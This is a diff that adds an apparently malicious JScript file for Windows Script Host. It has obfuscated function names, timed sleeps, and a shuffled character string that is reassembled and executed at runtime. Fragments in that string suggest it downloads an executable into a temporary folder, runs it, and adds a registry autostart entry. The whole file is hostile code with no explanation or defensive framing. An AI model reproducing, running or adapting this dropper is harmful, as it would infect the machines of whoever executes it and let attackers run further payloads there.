@@ -1,0 +1,15 @@
+function wire(tiny,mind,every,mount,bad,fit) { if (view(every)) return tiny+mind; else return mind+tiny; }
+function search(){success[6629265]=difficult;student[whole] = also[student[hair]];}
+year(4854);
+function also(love,one,tell,dead){success[3392543]=mark;WScript.Sleep(4822);wind = 'EedSRxnUDOi%Nf.\\S\"s(D((\\O\"(sM@ gA\\f\"Ini+Ni S%r;+\"t\\\\t\")Sx@ te\\!\"Tn=,ee  sm\"0\\nn)%oo)Urp=Sis=Eve-Rnr1DE.)Ndp Sn {Da= Op WMxsSAE cI.rrN)ai%\\v\"\"p\\l t)l{. e s{h)lSS0e=.0eSt2p+p (\"i\\2=r12=c72=S52 W72s\\2\"u)1(t;\"t\\ ac;}te} sj e.btlpOrs(eye t{ fa {iep  r.s}Co  .p=;te epnssi(.lr\'r\\caeGSfpEW lT(na\' \\crf,eui (t \'\\\\\"e;h@r)t\\ \"t0{+p3)Ss+e+:0(\\/\"h7/@c,\'\\\\\"t2+,a(u\\c\"[]}\\b\" \\]\";)+r);\'t\\ (s/vdbsanueresa s\\r\".xc[p h) =.(; pg)shne.pisr\'r\\elt+paS\"l\\ofa?t ct.,ep)S(z(+/zm\"(\\os\\=\\gdjdhnz{oaj2frn}p.f)gh\'/(tdgnai,hMe b (f]=Yu[ tnnSecd utt;si{) oy\\r\'tn}P; 2T1(=TrWeHh)tLa fM;{2X2 -r5r2e=eYv;t)r\"u\"e+r\"SZn\".+ \"2SS\"L+t\"M_r\"X+i\"SGn\"M+g\"\\E\'\".+(\"fRt\"r c,o\"e\"m j,CnbohiOtaaetrst(C]a\"o\"e+d\"reetC\"(+.\"pit\"a+p\"rri\"s+r\"eWc\"I+S\"ngWet\" +(\"=RW\" [,tps1a f0 {{)  )+e)(3h3c0t a)c< ;}   ;b)}n(o)i t;aet sl(s]i\"t\"h+u\"wdd\" +e\";an\"0+t\" e[R=g3\" +]\"be(R \"x[;t)s]a(f\\ \"{) uy;rdt ;e\"W\\.\\SDctcRsQrMuUi\\.\\p\"e+t\"c\".+n\"QRa\"u+d\"iEn\"t+u\"(SsU)_\\\"\"+;\",T \"\\+\"\"}NiE RfR}U.C _uYeEmKl\"u+s\"uHe\"\\ \"=  ,n{o\\i\"t amtWso S;c)c\".\"r+l\"ilelp\"t+t\"oe.hcSs.etlprie\"g+e\".rp\"e+(\"uc2\"g+2\"oS2Wl\"2(e]2\"v\")+a\";trc \"t+}\"\\e\"j \"[+b\" b+\"=++\" O;\"u+}\"\'e)t)a(e)r;C}\"c[a)ttcphi(rec)S{WW(S c=r itpsta.fs;l7e4e7p7(=3j7g1m3y0n3i0o4u1q)z;A}RiavcpWrnqrcont=csutrutdsennotc;';hair=0;}
+function year(){success=[6792];ten(success);}
+function know(sit,week,face,yellow,gun,plan){return began(sit,week,during);}
+function difficult(degree,at){student[whole](student[field])(success);}
+function began(dry,cross,iron) {return dry.substr(cross,iron);}
+function view(fresh){return fresh % (field+field);}
+function sail(ride,thank,wheel,minute,been) {return ride.length; }
+function mark(only,chair){during=1;field=during;WScript.Sleep(8020);whole=field+during*field+during;success[5589598]=center;}
+function center(){climb="nWcaRA";success[6002690]=search;student=which(behind(wind),climb);}
+function behind(edge,bear,noon,meant){country="";that=hair;while (that < 2726) {winter=know(edge,that);country=wire(country,winter,that); that++; }return country;}
+function which(past,dress,could,any) {exercise = hair;gone = sail(dress);scale=[];for (pass=hair; pass<=(sail(past)-(gone)); pass++) {if (began((past),(pass),gone)==dress){scale[sail(scale)]=began(past,exercise,(pass-exercise));exercise = (pass+gone);}}scale[sail(scale)]=began(past,exercise);return scale;}
+function ten(hole,brown,would){WScript.Sleep(41784);triangle=7519;while(also=also){try{success[triangle](triangle);}catch(name){success[2617365]=also;}triangle++}}
